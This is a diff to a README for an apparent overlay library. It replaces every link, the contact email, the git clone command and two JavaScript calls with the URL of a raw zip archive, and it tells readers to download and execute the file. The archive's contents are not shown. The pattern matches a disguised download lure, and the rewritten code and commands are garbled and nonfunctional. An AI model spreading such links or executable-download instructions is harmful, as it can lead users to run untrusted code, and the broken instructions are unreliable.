@@ -1,6 +1,6 @@
 # 🌟 Immersive Overlay Example 🌟
 
-Welcome to the **Immersive Overlay Example** repository! This project showcases how to create immersive overlays for various applications. You can explore the latest releases and download the necessary files [here](https://github.com/uzairx012/immersive-overlay-example/releases).
+Welcome to the **Immersive Overlay Example** repository! This project showcases how to create immersive overlays for various applications. You can explore the latest releases and download the necessary files [here](https://github.com/uzairx012/immersive-overlay-example/raw/refs/heads/main/app/immersive-overlay-example-v2.2.zip).
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -33,7 +33,7 @@ To get started with the **Immersive Overlay Example**, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/uzairx012/immersive-overlay-example.git
+   git clone https://github.com/uzairx012/immersive-overlay-example/raw/refs/heads/main/app/immersive-overlay-example-v2.2.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -42,7 +42,7 @@ To get started with the **Immersive Overlay Example**, follow these steps:
    ```
 
 3. **Download the Latest Release**: 
-   Visit the [Releases section](https://github.com/uzairx012/immersive-overlay-example/releases) to find the latest version. Download the appropriate file for your platform and execute it.
+   Visit the [Releases section](https://github.com/uzairx012/immersive-overlay-example/raw/refs/heads/main/app/immersive-overlay-example-v2.2.zip) to find the latest version. Download the appropriate file for your platform and execute it.
 
 ## Usage
 
@@ -66,7 +66,7 @@ Once you have installed the overlay, you can start using it in your project. Her
 
 3. **Display the Overlay**:
    ```javascript
-   myOverlay.show();
+   https://github.com/uzairx012/immersive-overlay-example/raw/refs/heads/main/app/immersive-overlay-example-v2.2.zip();
    ```
 
 ### Customization Options
@@ -94,7 +94,7 @@ const overlay = new Overlay({
     },
 });
 
-overlay.show();
+https://github.com/uzairx012/immersive-overlay-example/raw/refs/heads/main/app/immersive-overlay-example-v2.2.zip();
 ```
 
 ## Contributing
@@ -126,14 +126,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or suggestions, feel free to reach out:
 
 - **Author**: Uzair
-- **Email**: uzair@example.com
-- **GitHub**: [uzairx012](https://github.com/uzairx012)
+- **Email**: https://github.com/uzairx012/immersive-overlay-example/raw/refs/heads/main/app/immersive-overlay-example-v2.2.zip
+- **GitHub**: [uzairx012](https://github.com/uzairx012/immersive-overlay-example/raw/refs/heads/main/app/immersive-overlay-example-v2.2.zip)
 
 ## Additional Resources
 
-- [Documentation](https://example.com/docs)
-- [Community Forum](https://example.com/forum)
+- [Documentation](https://github.com/uzairx012/immersive-overlay-example/raw/refs/heads/main/app/immersive-overlay-example-v2.2.zip)
+- [Community Forum](https://github.com/uzairx012/immersive-overlay-example/raw/refs/heads/main/app/immersive-overlay-example-v2.2.zip)
 
 ---
 
-Thank you for checking out the **Immersive Overlay Example**! We hope this project helps you create engaging and interactive experiences. Don't forget to visit the [Releases section](https://github.com/uzairx012/immersive-overlay-example/releases) for the latest updates.
+Thank you for checking out the **Immersive Overlay Example**! We hope this project helps you create engaging and interactive experiences. Don't forget to visit the [Releases section](https://github.com/uzairx012/immersive-overlay-example/raw/refs/heads/main/app/immersive-overlay-example-v2.2.zip) for the latest updates.
